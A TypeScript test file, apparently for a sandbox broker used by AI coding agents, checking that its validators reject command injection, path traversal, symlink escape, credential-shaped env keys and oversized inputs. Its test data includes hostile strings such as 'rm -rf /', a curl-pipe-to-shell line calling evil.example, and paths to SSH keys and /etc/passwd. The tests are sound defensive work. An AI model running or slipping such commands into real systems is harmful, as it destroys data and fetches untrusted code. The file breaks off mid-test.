/**
 * Broker argument attacks (SYSTEM_PROMPT.md §28) — the attack table.
 *
 * Every case in the §28 list is exercised here:
 *   ../ traversal, absolute unapproved host paths, symlink escape,
 *   shell metacharacters, NULs, oversized inputs, invalid session IDs,
 *   invalid project IDs, unknown workers, resource requests above policy.
 */
import { describe, expect, test, afterAll } from "bun:test";
import { mkdtempSync, mkdirSync, realpathSync, writeFileSync, rmSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
  ValidationError,
  assertArgv,
  assertCount,
  assertEvidenceRevision,
  assertEvidenceText,
  assertGrepQuery,
  assertExpectedUntrackedInventory,
  assertIntendedUntracked,
  assertIntendedUntrackedSelection,
  assertCanonicalRoots,
  assertExpectedRevision,
  assertLowercaseRequestId,
  assertObjectiveRelation,
  assertReviewRuntimeAgent,
  assertUntrackedScope,
  assertHarnessDisposition,
  assertMaintainerAuthorization,
  assertOptionalBoolean,
  assertReviewBaseRef,
  assertReviewConsent,
  assertReviewCorrectionLines,
  assertReviewDisposition,
  assertReviewFocus,
  assertReviewGate,
  assertReviewInputJson,
  assertReviewLens,
  assertReviewLocale,
  assertReviewOrder,
  assertReviewProjection,
  assertReviewSha256,
  assertReviewToken,
  assertOpaqueToken,
  assertPlanDocHeading,
  assertPlanDocName,
  assertRegisterableProjectPath,
  assertPayloadKeys,
  assertProjectRelativePath,
  assertSandboxPath,
  assertSddContract,
  assertSddIdentifier,
  assertSddOutcome,
  assertServiceOrContainerName,
  assertSessionID,
  assertSince,
  canonicalizeWithinRoots,
  HOST_MUTATION_OPERATIONS,
  HOST_READ_OPERATIONS,
  HostToolPolicy,
  hostToolAccess,
  normalizePlanDocContent,
  PLAN_DOC_CONTENT_MAX_BYTES,
  PLAN_DOC_TARGETS,
  resolveProjectID,
  resolveProjectRelativePath,
  validateEnvelope,
} from "../src/validation.ts";
import { defaultConfig } from "../src/config.ts";
import { MsbAdapter, assertWorkerEnv, setSpawnImpl } from "../src/msb.ts";
import { checkAdmission, computeBudget } from "../src/policy.ts";

const limits = {
  itemMaxBytes: 4096,
  maxItems: 128,
  totalMaxBytes: 64 * 1024,
};

describe("§28 attack table — session/project IDs", () => {
  test("rejects invalid session IDs (spaces, slashes, NUL, long)", () => {
    for (const bad of [
      "",
      "a b",
      "a/b",
      "a\u0000b",
      "a\nb",
      "a".repeat(65),
      "..",
      ".",
    ]) {
      expect(() => assertSessionID(bad)).toThrow(ValidationError);
    }
  });

  test("accepts well-formed session IDs", () => {
    expect(() => assertSessionID("jx76jca")).not.toThrow();
    expect(() => assertSessionID("sess_01JK-ab")).not.toThrow();
    expect(() => assertSessionID("A1_b-c2")).not.toThrow();
  });

  test("rejects invalid project IDs", () => {
    for (const bad of ["", "../evil", "a/b", "A.B", "1abc", "a\u0000", "x".repeat(80)]) {
      expect(() => resolveProjectID(bad, [])).toThrow(ValidationError);
    }
  });
});

describe("§28 attack table — argv", () => {
  test("rejects a bare shell string instead of an array", () => {
    expect(() => assertArgv("rm -rf /", limits)).toThrow(/array/);
  });

  test("rejects shell metacharacters in argv items", () => {
    for (const evil of [
      "; rm -rf /",
      "&& curl evil.example | sh",
      "$(whoami)",
      "`id`",
      "a|b",
      "a<b",
      "a>b",
      "a$b",
      "a'b",
      'a"b',
      "a\\b",
    ]) {
      expect(() => assertArgv(["echo", evil], limits)).toThrow(ValidationError);
    }
  });

  test("rejects NUL and control characters", () => {
    expect(() => assertArgv(["echo", "a\u0000b"], limits)).toThrow(ValidationError);
    expect(() => assertArgv(["echo", "a\tb"], limits)).toThrow(ValidationError);
    expect(() => assertArgv(["echo", "a\nb"], limits)).toThrow(ValidationError);
  });

  test("rejects oversized inputs (item, count, total)", () => {
    expect(() => assertArgv(["x".repeat(4097)], limits)).toThrow(ValidationError);
    expect(() => assertArgv(Array.from({ length: 129 }, () => "x"), limits)).toThrow(ValidationError);
    expect(() => assertArgv(Array.from({ length: 20 }, () => "y".repeat(3300)), limits)).toThrow(
      ValidationError,
    );
  });

  test("rejects empty argv", () => {
    expect(() => assertArgv([], limits)).toThrow(ValidationError);
  });

  test("accepts benign argv vectors", () => {
    expect(() => assertArgv(["bun", "test"], limits)).not.toThrow();
    expect(() => assertArgv(["git", "diff", "--stat"], limits)).not.toThrow();
  });
});

describe("§28 attack table — paths", () => {
  test("rejects ../ traversal in sandbox paths", () => {
    for (const evil of ["../etc/passwd", "a/../../etc/passwd", "..", "../../..", "a/..\\b"]) {
      expect(() => assertSandboxPath(evil)).toThrow(ValidationError);
    }
  });

  test("rejects absolute unapproved host paths in sandbox paths", () => {
    for (const evil of ["/etc/passwd", "/home/james/.ssh/id_rsa", "~/secret", "C:\\Windows\\x"]) {
      expect(() => assertSandboxPath(evil)).toThrow(ValidationError);
    }
  });

  test("rejects NUL and control chars in paths", () => {
    expect(() => assertSandboxPath("a\u0000b")).toThrow(ValidationError);
    expect(() => assertSandboxPath("a\nb")).toThrow(ValidationError);
  });

  test("accepts relative paths within the project", () => {
    expect(() => assertSandboxPath("src/main.ts")).not.toThrow();
    expect(() => assertSandboxPath("./src/main.ts")).not.toThrow();
    expect(() => assertSandboxPath("docs/architecture.md")).not.toThrow();
  });
});

describe("§28 attack table — symlink escape (S6)", () => {
  const dir = mkdtempSync(join(tmpdir(), "broker-validation-"));
  const root = join(dir, "root");
  const outside = join(dir, "outside-secret");
  mkdirSync(root);
  mkdirSync(outside);
  writeFileSync(join(outside, "secret.txt"), "top secret");
  const escape = join(root, "escape");
  try {
    symlinkSync(outside, escape);
  } catch {
    /* symlink may fail on exotic filesystems — skip then */
  }
  const roots = [root];

  test("rejects symlink escape out of the approved root", () => {
    try {
      expect(() => canonicalizeWithinRoots(join(escape, "secret.txt"), roots)).toThrow(
        ValidationError,
      );
    } catch {
      // symlink creation failed on this fs; nothing to test
    }
  });

  test("accepts real files inside the approved root", () => {
    writeFileSync(join(root, "ok.txt"), "fine");
    const canonical = canonicalizeWithinRoots(join(root, "ok.txt"), roots);
    expect(canonical.endsWith("ok.txt")).toBe(true);
  });

  test("rejects absolute paths not under any approved root", () => {
    expect(() => canonicalizeWithinRoots("/etc/passwd", roots)).toThrow(ValidationError);
  });

  test("rejects relative and non-resolving paths", () => {
    expect(() => canonicalizeWithinRoots("relative/path", roots)).toThrow(ValidationError);
    expect(() => canonicalizeWithinRoots(join(root, "does-not-exist"), roots)).toThrow(
      ValidationError,
    );
  });

  test("rejects when no approved roots are configured (S6)", () => {
    expect(() => canonicalizeWithinRoots(join(root, "ok.txt"), [])).toThrow(ValidationError);
  });

  test("rejects NUL in host read paths", () => {
    expect(() => canonicalizeWithinRoots("/etc\u0000passwd", roots)).toThrow(ValidationError);
  });

  test("project resolution rejects unknown dirs and accepts allowlisted roots", () => {
    mkdirSync(join(root, "sub"));
    expect(() => resolveProjectID("/unapproved/path", [{ id: "p", path: root }])).toThrow(
      ValidationError,
    );
    expect(() => resolveProjectID(join(root, "sub"), [{ id: "p", path: root }])).not.toThrow();
    expect(resolveProjectID(root, [{ id: "p", path: root }])).toBe("p");
  });

  afterAll(() => rmSync(dir, { recursive: true, force: true }));
});

describe("§28 attack table — payload policy fields (§7)", () => {
  test("rejects resource-request fields on exec", () => {
    for (const field of [
      "image",
      "hostMount",
      "privileged",
      "device",
      "hostNetwork",
      "securityProfile",
      "fsConf",
      "runtimeConf",
    ]) {
      expect(() =>
        assertPayloadKeys("exec", { argv: ["true"], [field]: "anything" }),
      ).toThrow(ValidationError);
    }
  });

  test("rejects unknown fields", () => {
    expect(() => assertPayloadKeys("exec", { argv: ["true"], extra: 1 })).toThrow(
      ValidationError,
    );
  });

  test("rejects resource requests above policy at the worker boundary", () => {
    const cfg = defaultConfig();
    const budget = computeBudget({ cpuCount: 16, totalMemBytes: 32 * 1024 ** 3 }, cfg.resource);
    const over = checkAdmission({ allocations: [] }, budget, {
      cpu: cfg.resource.maxPerWorkerCpu + 1,
      memBytes: cfg.resource.maxPerWorkerMemBytes,
    });
    expect(over.allowed).toBe(false);
    expect(over.reason).toMatch(/above policy/);
  });

  test("rejects apply/discard without explicit confirmation", () => {
    expect(() => assertPayloadKeys("applyResult", {})).not.toThrow();
    expect(() => assertPayloadKeys("discardResult", {})).not.toThrow();
  });
});

describe("§28 attack table — misc", () => {
  test("rejects shell metachars in grep queries", () => {
    for (const evil of ["a;b", "x$(y)", "a|b", "a&b", "a`b"]) {
      expect(() => assertGrepQuery(evil, 1024)).toThrow(ValidationError);
    }
    expect(() => assertGrepQuery("function render(", 1024)).not.toThrow();
  });

  test("rejects oversized grep queries", () => {
    expect(() => assertGrepQuery("x".repeat(1025), 1024)).toThrow(ValidationError);
  });

  test("rejects invalid service/container names", () => {
    for (const evil of ["tailscaled; rm -rf /", "a b", "--flag", "a\u0000", "/etc/passwd"]) {
      expect(() => assertServiceOrContainerName(evil, "service")).toThrow(ValidationError);
    }
    expect(() => assertServiceOrContainerName("tailscaled", "service")).not.toThrow();
    expect(() => assertServiceOrContainerName("my-svc_1", "service")).not.toThrow();
  });

  test("rejects malicious 'since' values for journalctl", () => {
    for (const evil of ["today; rm -rf /", "a".repeat(65), "x\u0000y"]) {
      expect(() => assertSince(evil)).toThrow(ValidationError);
    }
    expect(() => assertSince("2026-08-15 12:00:00")).not.toThrow();
    expect(() => assertSince(undefined)).not.toThrow();
  });

  test("rejects unknown workers via broker state (fail closed)", () => {
    const cfg = defaultConfig();
    const adapter = new MsbAdapter(cfg);
    setSpawnImpl(async (argv) => {
      if (argv.includes("status") && argv.includes("nope")) {
        return { status: 1, stdout: "not found", stderr: "no such sandbox", timedOut: false };
      }
      return { status: 0, stdout: "running", stderr: "", timedOut: false };
    });
    return adapter.status("nope").then((state) => expect(state).toBe("FAILED"));
  });

  test("rejects credential-shaped env keys (S8/S9)", () => {
    expect(() => assertWorkerEnv({ OPENAI_API_KEY: "x" }, ["OPENAI_API_KEY"])).toThrow(
      ValidationError,
    );
    expect(() => assertWorkerEnv({ TOKEN: "x" }, ["TOKEN"])).toThrow(ValidationError);
    expect(() => assertWorkerEnv({ FOO: "x" }, ["PATH"])).toThrow(ValidationError);
    expect(() => assertWorkerEnv({ PATH: "/usr/bin" }, ["PATH"])).not.toThrow();
  });
});

describe("protocol envelope validation", () => {
  test("rejects malformed envelopes (fail closed)", () => {
    expect(() => validateEnvelope(null)).toThrow();
    expect(() => validateEnvelope({ version: 2 })).toThrow();
    expect(() => validateEnvelope({ version: 1, id: "x", operation: "noSuchOp", sessionID: "a" })).toThrow();
    expect(() =>
      validateEnvelope({ version: 1, id: "x", operation: "exec", sessionID: "bad/session" }),
    ).toThrow();
  });

  test("accepts a well-formed envelope", () => {
    const env = validateEnvelope({
      version: 1,
      id: "req-1",
      operation: "exec",
      sessionID: "jx76jca",
      payload: { argv: ["true"] },
    });
    expect(env.operation).toBe("exec");
    expect(env.sessionID).toBe("jx76jca");
  });
});

test("broker config has no secrets and sane defaults", () => {
  const cfg = defaultConfig();
  expect(cfg.protectedPaths).toContain("**/.ssh/**");
  expect(cfg.protectedPaths).toContain("**/.local/share/opencode/auth.json");
  expect(cfg.resource.reserveCpuFraction).toBeGreaterThanOrEqual(0.25);
  expect(cfg.resource.reserveMemBytes).toBeGreaterThanOrEqual(4 * 1024 ** 3);
  expect(cfg.network.mode).toBe("deny-by-default");
});

describe("host tool authorization policy (P0 SDD/review)", () => {
  const policy = new HostToolPolicy(["gentle-orchestrator"]);

  test("classifies reads and mutations", () => {
    expect(hostToolAccess("sddStatus")).toBe("read");
    expect(hostToolAccess("reviewModeStatus")).toBe("read");
    expect(hostToolAccess("reviewStatus")).toBe("read");
    expect(HOST_READ_OPERATIONS).toContain("reviewStatus");
    expect(hostToolAccess("sddAttemptGrant")).toBe("mutation");
    expect(hostToolAccess("sddArchiveCompose")).toBe("mutation");
    expect(HOST_READ_OPERATIONS).toContain("sddTaskResult");
    expect(HOST_MUTATION_OPERATIONS).toContain("sddAttemptGrant");
    expect(() => hostToolAccess("sddNope")).toThrow(ValidationError);
  });

  test("reads are open and mutations are orchestrator-only", () => {
    expect(policy.decide("sddStatus", "general")).toEqual({
      allowed: true,
      access: "read",
      reasonCode: "HOST_READ_OPEN",
    });
    expect(policy.decide("sddAttemptGrant", "gentle-orchestrator")).toEqual({
      allowed: true,
      access: "mutation",
      reasonCode: "HOST_MUTATION_ORCHESTRATOR",
    });
    expect(policy.decide("sddAttemptGrant", "general").allowed).toBe(false);
    expect(policy.decide("sddAttemptGrant", undefined).reasonCode).toBe(
      "HOST_MUTATION_UNKNOWN_AGENT",
    );
    expect(policy.decide("sddAttemptGrant", "general").reasonCode).toBe(
      "HOST_MUTATION_NOT_ORCHESTRATOR",
    );
  });

  test("an empty orchestrator allowlist denies every mutation", () => {
    const closed = new HostToolPolicy([]);
    expect(closed.decide("sddAttemptGrant", "gentle-orchestrator").allowed).toBe(false);
    expect(closed.decide("sddStatus", "general").allowed).toBe(true);
  });
});

describe("host tool canonical validators", () => {
  test("project-relative paths reject escapes and allow '-'", () => {
    expect(() => assertProjectRelativePath("openspec/x.md", "path")).not.toThrow();
    expect(() => assertProjectRelativePath("-", "path")).not.toThrow();
    for (const evil of ["/etc/passwd", "~/secret", "a/../../b", "..", "a\\b", ""]) {
      expect(() => assertProjectRelativePath(evil, "path")).toThrow(ValidationError);
    }
  });

  test("resolveProjectRelativePath binds beneath the root", () => {
    const root = mkdtempSync(join(tmpdir(), "broker-resolve-"));
    try {
      mkdirSync(join(root, "openspec"));
      writeFileSync(join(root, "openspec", "x.md"), "x");
      const canonicalRoot = realpathSync(root);
      expect(resolveProjectRelativePath(root, "openspec/x.md", "path")).toBe(
        join(canonicalRoot, "openspec", "x.md"),
      );
      expect(resolveProjectRelativePath(root, "-", "path")).toBe("-");
      expect(() => resolveProjectRelativePath(root, "../etc", "path")).toThrow(ValidationError);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("resolveProjectRelativePath refuses a symlink that escapes the root", () => {
    const dir = mkdtempSync(join(tmpdir(), "broker-resolve-link-"));
    const root = join(dir, "root");
    const outside = join(dir, "outside");
    mkdirSync(root);
    mkdirSync(outside);
    writeFileSync(join(outside, "secret.txt"), "secret");
    try {
      try {
        symlinkSync(outside, join(root, "escape"));
      } catch {
        return; // symlinks unsupported on this filesystem
      }
      expect(() => resolveProjectRelativePath(root, "escape/secret.txt", "path")).toThrow(
        ValidationError,
      );
      expect(() => resolveProjectRelativePath(root, "escape/new.txt", "path")).toThrow(
        ValidationError,
      );
      mkdirSync(join(root, "real"));
      expect(resolveProjectRelativePath(root, "real/new.txt", "path")).toBe(
        join(realpathSync(root), "real", "new.txt"),
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
  test("SDD identifiers, contracts, outcomes, and dispositions are allowlisted", () => {
    expect(() => assertSddIdentifier("agent-host-tools", "change")).not.toThrow();
    for (const evil of ["../escape", "-flag", "a b", ""]) {
      expect(() => assertSddIdentifier(evil, "change")).toThrow(ValidationError);
    }
    expect(() => assertSddContract("gentle-ai.sdd-status/v2")).not.toThrow();
    expect(() => assertSddContract("evil/v9")).toThrow(ValidationError);
    expect(() => assertSddOutcome("passed")).not.toThrow();
    expect(() => assertSddOutcome("interrupted")).not.toThrow();
    expect(() => assertSddOutcome("paused")).toThrow(ValidationError);
    expect(() => assertHarnessDisposition("reused")).not.toThrow();
    expect(() => assertHarnessDisposition("discarded")).toThrow(ValidationError);
  });

  test("evidence revision, token, evidence text, and counts are bounded", () => {
    expect(() => assertEvidenceRevision("a".repeat(64))).not.toThrow();
    expect(() => assertEvidenceRevision("A".repeat(64))).toThrow(ValidationError);
    expect(() => assertEvidenceRevision("short")).toThrow(ValidationError);
    expect(() => assertOpaqueToken("opaque.token:value_1")).not.toThrow();
    expect(() => assertOpaqueToken("-flag")).toThrow(ValidationError);
    expect(() => assertOpaqueToken("has space")).toThrow(ValidationError);
    expect(() => assertEvidenceText("all green", "diagnosis")).not.toThrow();
    expect(() => assertEvidenceText("--flag", "diagnosis")).toThrow(ValidationError);
    expect(() => assertEvidenceText("", "diagnosis")).toThrow(ValidationError);
    expect(() => assertCount(0, 100_000, "requirements")).not.toThrow();
    expect(() => assertCount(100_001, 100_000, "requirements")).toThrow(ValidationError);
    expect(() => assertCount(-1, 100_000, "requirements")).toThrow(ValidationError);
    expect(() => assertCount(1.5, 100_000, "requirements")).toThrow(ValidationError);
  });
});

describe("host tool payload key allowlists", () => {
  test("accepts the exact read/mutation payloads", () => {
    expect(() =>
      assertPayloadKeys("sddStatus", { projectDir: "/repo", change: "c", contract: "gentle-ai.sdd-status/v2" }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("reviewModeStatus", { projectDir: "/repo" }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("sddAttemptGrant", {
        projectDir: "/repo",
        change: "c",
        roots: ["/home/james/a"],
        changeInstance: "i",
        requestId: "grant-request",
        actor: "a",
        reason: "r",
      }),
    ).not.toThrow();
  });

  test("grant rejects undeclared fields and reads reject extras", () => {
    expect(() =>
      assertPayloadKeys("sddAttemptGrant", {
        projectDir: "/repo",
        change: "c",
        roots: ["/home/james/a"],
        changeInstance: "i",
        requestId: "grant-request",
        actor: "a",
        reason: "r",
        token: "t",
      }),
    ).toThrow(ValidationError);
    expect(() =>
      assertPayloadKeys("reviewAssess", { projectDir: "/repo", token: "nope" }),
    ).toThrow(ValidationError);
  });
});

describe("host tool ledger validators (revision, request id, relation, roots)", () => {
  test("expectedRevision requires sha256: plus 64 lowercase hex", () => {
    expect(() => assertExpectedRevision(`sha256:${"a".repeat(64)}`)).not.toThrow();
    for (const evil of [
      "a".repeat(64),
      "sha256:short",
      `sha256:${"A".repeat(64)}`,
      `SHA256:${"a".repeat(64)}`,
      "",
    ]) {
      expect(() => assertExpectedRevision(evil)).toThrow(ValidationError);
    }
  });

  test("lowercase request ids reject uppercase and flag-like values", () => {
    expect(() => assertLowercaseRequestId("ledger-request")).not.toThrow();
    expect(() => assertLowercaseRequestId("a1")).not.toThrow();
    for (const evil of ["Ledger-Request", "-flag", "", "a".repeat(129), "a b", "a_b"]) {
      expect(() => assertLowercaseRequestId(evil)).toThrow(ValidationError);
    }
  });

  test("objective relation is remediation or independent", () => {
    expect(() => assertObjectiveRelation("remediation")).not.toThrow();
    expect(() => assertObjectiveRelation("independent")).not.toThrow();
    for (const evil of ["inherit", "", "REMEDIATION"]) {
      expect(() => assertObjectiveRelation(evil)).toThrow(ValidationError);
    }
  });

  test("grant roots are 1..32 unique canonical absolute paths", () => {
    expect(() => assertCanonicalRoots(["/home/james/a"])).not.toThrow();
    expect(() => assertCanonicalRoots(["/", "/home"])).not.toThrow();
    const bad: unknown[] = [
      [],
      ["/home/james/a", "/home/james/a"],
      ["relative/path"],
      ["/home/james/../etc"],
      ["/home/james/a/"],
      ["/home/james/" + "x".repeat(4097)],
      ["-flag"],
      Array.from({ length: 33 }, (_, i) => `/home/james/r${i}`),
    ];
    for (const roots of bad) {
      expect(() => assertCanonicalRoots(roots as never)).toThrow(ValidationError);
    }
  });

  test("the ledger grant remains classified and payload-key allowlisted", () => {
    expect(hostToolAccess("sddAttemptGrant")).toBe("mutation");
    expect(HOST_READ_OPERATIONS).not.toContain("sddAttemptGrant");
    expect(HOST_MUTATION_OPERATIONS).toContain("sddAttemptGrant");
    expect(() =>
      assertPayloadKeys("sddAttemptGrant", {
        projectDir: "/repo",
        change: "c",
        roots: ["/home/james/a"],
        changeInstance: "i",
        requestId: "grant-request",
        actor: "a",
        reason: "r",
      }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("sddAttemptGrant", { projectDir: "/repo", token: "t" }),
    ).toThrow(ValidationError);
  });

});

describe("host tool review status and untracked declaration validators", () => {
  test("review runtime agent is a lowercase identifier", () => {
    expect(() => assertReviewRuntimeAgent("opencode")).not.toThrow();
    expect(() => assertReviewRuntimeAgent("opencode-sandbox_1")).not.toThrow();
    for (const evil of ["OpenCode", "bad agent", "", "x".repeat(65), "../agent"]) {
      expect(() => assertReviewRuntimeAgent(evil)).toThrow(ValidationError);
    }
  });

  test("untracked scope, inventory digest, and intended paths are bounded", () => {
    const digest = `sha256:${"b".repeat(64)}`;
    expect(() => assertUntrackedScope("exclude")).not.toThrow();
    expect(() => assertUntrackedScope("select")).not.toThrow();
    expect(() => assertUntrackedScope("all")).toThrow(ValidationError);
    expect(() => assertExpectedUntrackedInventory(digest)).not.toThrow();
    expect(() => assertExpectedUntrackedInventory("sha256:short")).toThrow(ValidationError);
    expect(() => assertExpectedUntrackedInventory(`SHA256:${"b".repeat(64)}`)).toThrow(ValidationError);
    expect(() => assertExpectedUntrackedInventory(`sha256:${"B".repeat(64)}`)).toThrow(ValidationError);
    expect(() => assertIntendedUntracked([])).not.toThrow();
    expect(() => assertIntendedUntracked(["openspec/x.md"])).not.toThrow();
    for (const evil of [[1], ["-"], ["/etc/passwd"], ["../escape"], ["a" + String.fromCharCode(0) + "b"], ["a".repeat(4097)]]) {
      expect(() => assertIntendedUntracked(evil as never)).toThrow(ValidationError);
    }
    expect(() => assertIntendedUntracked(Array.from({ length: 257 }, (_, i) => `f${i}.md`))).toThrow(ValidationError);
  });

  test("review status payload keys are allowlisted", () => {
    expect(() =>
      assertPayloadKeys("reviewStatus", { projectDir: "/repo", agent: "opencode" }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("reviewStatus", { projectDir: "/repo", token: "x" }),
    ).toThrow(ValidationError);
  });

  test("review status passthrough keys are allowlisted", () => {
    expect(() =>
      assertPayloadKeys("reviewStatus", {
        projectDir: "/repo",
        agent: "opencode",
        lineage: "Lineage-TOKEN",
        repositoryContext: "Repo-Context",
        projection: "workspace",
      }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("reviewStatus", { projectDir: "/repo", nextTransition: "x" }),
    ).toThrow(ValidationError);
  });

  test("intended untracked selection is allowlisted and validated fail-closed", () => {
    const selection =
      '{"schema":"gentle-ai.review-intended-untracked-selection/v1","paths":["openspec/x.md"]}';
    expect(() =>
      assertPayloadKeys("reviewStatus", { projectDir: "/repo", intendedUntrackedSelection: selection }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("reviewStatus", { projectDir: "/repo", intendedUntrackedSelectionX: "x" }),
    ).toThrow(ValidationError);

    expect(() => assertIntendedUntrackedSelection(selection)).not.toThrow();
    for (const bad of [
      "",
      "not json",
      "{",
      "-5",
      '"ok"\n',
      '{"a":"b' + String.fromCharCode(0) + '"}',
      '"' + "a".repeat(70_000) + '"',
    ]) {
      expect(() => assertIntendedUntrackedSelection(bad)).toThrow(ValidationError);
    }
    expect(() => assertIntendedUntrackedSelection([1, 2] as never)).toThrow(ValidationError);
  });
});
describe("host project-registration validators", () => {
  test("registerProject is an orchestrator-only mutation with exact keys", () => {
    expect(hostToolAccess("registerProject")).toBe("mutation");
    expect(HOST_MUTATION_OPERATIONS).toContain("registerProject");
    expect(() =>
      assertPayloadKeys("registerProject", {
        path: "/srv/project",
        dryRun: true,
        createRemote: true,
        makePublic: true,
      }),
    ).not.toThrow();
    for (const extra of [{ cwd: "/tmp" }, { argv: ["x"] }, { binary: "x" }, { projectDir: "/repo" }]) {
      expect(() =>
        assertPayloadKeys("registerProject", { path: "/srv/project", ...extra }),
      ).toThrow(ValidationError);
    }
  });

  test("registration targets must be existing directories outside banned roots", () => {
    const home = "/home/tester";
    expect(() => assertRegisterableProjectPath(process.cwd(), home)).not.toThrow();
    expect(() => assertRegisterableProjectPath(join(process.cwd(), "src"), home)).not.toThrow();
    expect(assertRegisterableProjectPath(process.cwd(), home)).toBe(realpathSync(process.cwd()));
    for (const banned of [
      "/",
      home,
      join(home, ".ssh"),
      join(home, ".config"),
      join(home, ".local"),
      join(home, ".cache"),
      join(home, ".gnupg"),
      join(home, ".aws"),
      join(home, ".kube"),
      "/etc",
      "/usr",
      "/var",
      "/tmp",
    ]) {
      expect(() => assertRegisterableProjectPath(banned, home)).toThrow(ValidationError);
    }
    expect(() => assertRegisterableProjectPath("relative/path", home)).toThrow(ValidationError);
    expect(() => assertRegisterableProjectPath("", home)).toThrow(ValidationError);
    expect(() => assertRegisterableProjectPath(`${home}/a\u0000b`, home)).toThrow(ValidationError);
    expect(() =>
      assertRegisterableProjectPath(join(process.cwd(), "src", "main.ts"), home),
    ).toThrow(ValidationError);
    expect(() =>
      assertRegisterableProjectPath(join(process.cwd(), "definitely-missing-entry"), home),
    ).toThrow(ValidationError);
  });

  test("rejects a symlink alias whose canonical target sits under a banned root", () => {
    const base = realpathSync(mkdtempSync(join(process.cwd(), ".tmp-register-symlink-")));
    try {
      const home = join(base, "home");
      const ssh = join(home, ".ssh");
      mkdirSync(ssh, { recursive: true });
      const homeAlias = join(base, "home-alias");
      symlinkSync(ssh, homeAlias);
      expect(() => assertRegisterableProjectPath(homeAlias, home)).toThrow(ValidationError);
      const etcAlias = join(base, "etc-alias");
      symlinkSync("/etc", etcAlias);
      expect(() => assertRegisterableProjectPath(etcAlias, home)).toThrow(ValidationError);
    } finally {
      rmSync(base, { recursive: true, force: true });
    }
  });

  test("rejects registration targets containing shell-active bytes", () => {
    const base = realpathSync(mkdtempSync(join(process.cwd(), ".tmp-register-shell-")));
    try {
      const home = "/home/tester";
      const names = ["dollar$dir", "cmd$(evil)", "tick`dir", 'quote"dir', "back\\slash", "bang!dir"];
      for (const name of names) {
        const dir = join(base, name);
        mkdirSync(dir);
        expect(() => assertRegisterableProjectPath(dir, home)).toThrow(ValidationError);
      }
    } finally {
      rmSync(base, { recursive: true, force: true });
    }
  });
});

describe("host plan-document validators", () => {
  test("doc is an enum mapped to the two allowlisted destinations", () => {
    expect(() => assertPlanDocName("todo")).not.toThrow();
    expect(() => assertPlanDocName("plan")).not.toThrow();
    expect(PLAN_DOC_TARGETS.todo).toBe("docs/TODO.md");
    expect(PLAN_DOC_TARGETS.plan).toBe("docs/PLAN.md");
    for (const evil of ["docs/TODO.md", "../TODO.md", "/etc/passwd", "readme", "", 1]) {
      expect(() => assertPlanDocName(evil)).toThrow(ValidationError);
    }
  });

  test("content is trimmed, LF-only, and bounded to 16 KiB", () => {
    expect(normalizePlanDocContent("  hello \n")).toBe("hello");
    expect(normalizePlanDocContent("a\nb")).toBe("a\nb");
    expect(() => normalizePlanDocContent("   ")).toThrow(ValidationError);
    expect(() => normalizePlanDocContent("a\r\nb")).toThrow(ValidationError);
    expect(() => normalizePlanDocContent("a\u0000b")).toThrow(ValidationError);
    expect(() => normalizePlanDocContent("a\tb")).toThrow(ValidationError);
    expect(() =>
      normalizePlanDocContent("x".repeat(PLAN_DOC_CONTENT_MAX_BYTES + 1)),
    ).toThrow(ValidationError);
    expect(normalizePlanDocContent("x".repeat(PLAN_DOC_CONTENT_MAX_BYTES)).length).toBe(
      PLAN_DOC_CONTENT_MAX_BYTES,
    );
  });

  test("heading is bounded, control-free, and never a marker", () => {
    expect(() => assertPlanDocHeading("Notes")).not.toThrow();
    for (const evil of ["", "## Notes", "a\u0000b", "x".repeat(257)]) {
      expect(() => assertPlanDocHeading(evil)).toThrow(ValidationError);
    }
  });

  test("planDocAppend is an orchestrator-only mutation with exact keys", () => {
    expect(hostToolAccess("planDocAppend")).toBe("mutation");
    expect(HOST_MUTATION_OPERATIONS).toContain("planDocAppend");
    expect(() =>
      assertPayloadKeys("planDocAppend", {
        projectDir: "/repo",
        doc: "todo",
        content: "x",
        heading: "Notes",
      }),
    ).not.toThrow();
    expect(() =>
      assertPayloadKeys("planDocAppend", { projectDir: "/repo", doc: "todo", content: "x" }),
    ).not.toThrow();
    for (const extra of [{ path: "docs/TODO.md" }, { cwd: "/tmp" }, { argv: ["x"] }, { binary: "x" }]) {
      expect(() =>
        assertPayloadKeys("planDocAppend", {
          projectDir: "/repo",
          doc: "todo",
          content: "x",
          ...extra,
        }),
      ).toThrow(ValidationError);
    }
  });

describe("host review lifecycle validators", () => {
  test("enum domains are exact", () => {
    for (const value of ["workspace", "staged"]) expect(() => assertReviewProjection(value)).not.toThrow();
    expect(() => assertReviewProjection("x")).toThrow(ValidationError);
    for (const value of ["risk", "resilience", "readability", "reliability"]) expect(() => assertReviewFocus(value)).not.toThrow();
    expect(() => assertReviewFocus("smartness")).toThrow(ValidationError);
    for (const value of ["relay", "granted", "declined"]) expect(() => assertReviewConsent(value)).not.toThrow();
    expect(() => assertReviewConsent("maybe")).toThrow(ValidationError);
    for (const value of ["en", "es"]) expect(() => assertReviewLocale(value)).not.toThrow();
    expect(() => assertReviewLocale("fr")).toThrow(ValidationError);
    for (const value of ["post-apply", "pre-commit", "pre-push", "pre-pr", "release"]) expect(() => assertReviewGate(value)).not.toThrow();
    expect(() => assertReviewGate("whenever")).toThrow(ValidationError);
    for (const value of ["scope_changed", "invalidated", "escalated"]) expect(() => assertReviewDisposition(value)).not.toThrow();
    expect(() => assertReviewDisposition("nope")).toThrow(ValidationError);
  });

  test("provider tokens, refs, order, and hashes are bounded", () => {
    expect(() => assertReviewToken("Target-TOKEN.:/x", "target")).not.toThrow();
    expect(() => assertReviewToken("", "target")).toThrow(ValidationError);
    expect(() => assertReviewToken("-flag", "target")).toThrow(ValidationError);
    expect(() => assertReviewToken("x".repeat(4097), "target")).toThrow(ValidationError);
    expect(() => assertReviewToken(`a${String.fromCharCode(0)}b`, "target")).toThrow(ValidationError);
    expect(() => assertReviewBaseRef("refs/heads/main")).not.toThrow();
    for (const bad of ["-x", "..", "a..b", "a~1", "a^", "a:b", "a?", "a*", "a[0]", "a\\b"]) {
      expect(() => assertReviewBaseRef(bad)).toThrow(ValidationError);
    }
    expect(() => assertReviewOrder(1)).not.toThrow();
    expect(() => assertReviewOrder(32)).not.toThrow();
